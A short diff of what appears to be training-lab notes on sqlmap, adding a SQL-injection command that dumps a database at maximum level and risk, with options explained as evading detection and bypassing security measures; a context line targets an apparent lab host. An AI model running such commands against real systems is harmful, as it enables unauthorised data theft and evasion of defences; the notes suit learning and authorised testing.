@@ -71,6 +71,12 @@ Each parameter is combined with unique parameter for protection, to bypass the u
 
 #sqlmap -u "http://154.57.164.79:31524/case9.php?id=1&uid=26987434" --randomize=uid --batch --dump
 
+# Using --random-agent in sqlmap
 
+#sqlmap -r req.txt -p email --level 5  --risk 3 --random-agent --chunked --dump
+
+--random-agent: This option tells sqlmap to use a randomly selected HTTP User-Agent header for each request, which can help evade detection.
+
+--chunked: This option instructs sqlmap to use chunked encoding in HTTP requests. Chunked encoding can help bypass some security measures.
 
 
